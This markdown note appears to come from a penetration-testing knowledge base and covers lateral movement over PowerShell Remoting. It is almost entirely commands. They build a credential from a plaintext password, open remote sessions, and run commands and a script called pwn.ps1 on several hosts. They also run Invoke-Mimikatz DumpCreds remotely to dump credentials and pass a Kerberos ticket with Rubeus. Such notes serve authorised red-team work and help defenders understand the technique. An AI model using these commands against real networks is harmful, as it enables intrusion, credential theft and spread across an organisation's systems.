---
title: PSRemoting Lateral Movement
---

[[notes/lateral-movement/index]] over [[notes/network/winrm]].

Create credential.

~~~ powershell
$c = New-Object System.Management.Automation.PSCredential -ArgumentList ('jdoe', (ConvertTo-SecureString 'passw0rd' -AsPlainText -Force))
~~~

Open interactive shell on remote system.

~~~ powershell
Enter-PSSession -Credential $c -ComputerName srv01.corp.local
~~~

Execute command on multiple systems at once.

~~~ powershell
Invoke-Command -Credential $c -ComputerName srv01.corp.local,srv02.corp.local -ScriptBlock {hostname;whoami;}
~~~

Execute script on multiple systems.

~~~ powershell
Invoke-Command -Credential $c -ComputerName srv01.corp.local,srv01.corp.local -File .\pwn.ps1
~~~

Execute local function on remote system.

~~~ powershell
Import-Module .\mimikatz.ps1
Invoke-Command -Credential $c -ComputerName srv01.corp.local -ScriptBlock ${function:Invoke-Mimikatz} -ArgumentList DumpCreds
~~~

Reuse sessions.

~~~ powershell
$s = New-PSSession -Credential $c -ComputerName srv01.corp.local
Invoke-Command -Session $s -ScriptBlock {hostname;}
Invoke-Command -Session $s -ScriptBlock {whoami;}
~~~

Establish session with Kerberos authentication.

~~~ powershell
$s = New-PSSession -Authentication Kerberos -Computer srv01.corp.local
Invoke-Command -Session $s -ScriptBlock {hostname;whoami;}
~~~

Establish session trough pass the ticket.

~~~ powershell
.\rubeus.exe ptt /ticket:%BASE64KIRBI%
Invoke-Command -ScriptBlock {whoami} -ComputerName srv01.corp.local -Authentication NegotiateWithImplicitCredential
~~~

Copy file.

~~~ powershell
Copy-Item -Path .\local.txt -ToSession $s -Destination C:\Users\jdoe\remote.txt
~~~

> **Note:** PSRemoting seems to be unsupported in Powershell on Linux.

References:

- [Transferring Functions with PSRemoting](http://web.archive.org/web/20220817035429/https://vexx32.github.io/2018/11/02/Transferring-Functions/)
- [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession)
- [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command)
